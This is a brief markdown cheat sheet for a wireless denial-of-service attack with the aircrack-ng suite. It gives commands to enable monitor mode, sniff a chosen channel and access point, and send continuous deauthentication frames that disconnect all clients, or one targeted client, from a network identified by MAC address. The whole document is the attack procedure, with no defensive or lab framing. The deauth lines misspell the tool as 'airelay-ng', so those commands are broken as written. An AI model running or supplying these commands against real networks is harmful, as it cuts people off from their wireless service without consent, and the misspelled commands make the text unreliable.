# Performing DoS Attack with AirCrack Toolkit

## Killing wireless interface blocking processes
```
airmon-ng check kill
```

## Switching wireless interface into monitoring mode
```
airmon-ng start wlan0
```

## Sniffing wireless traffic on all channels
```
airodump-ng wlan0mon
```

## Sniffing wireless traffic on selected channel (channel 1 in following example)
```
airodump-ng -c 1 wlan0mon
```

## Sniffing wireless traffic on selected channel and selected AP MAC
```
airodump-ng -c 1 --bssid 1c:1d:86:b6:c4:e0 wlan0mon
```

## Performing DoS attack to disconnect all clients connected to the provided Access Point (AP)
- Run the following command in new terminal window in parallel with airodump-ng command
```
airelay-ng -0 0 -a 1c:1d:86:b6:c4:e0 wlan0mon
```

## Performing DoS attack to disconnect selected client connected to the provided Access Point (AP)
- Run the following command in new terminal window in parallel with airodump-ng command
```
airelay-ng -0 0 -a 1c:1d:86:b6:c4:e0 -c c2:f1:81:e6:77:f4 wlan0mon
```

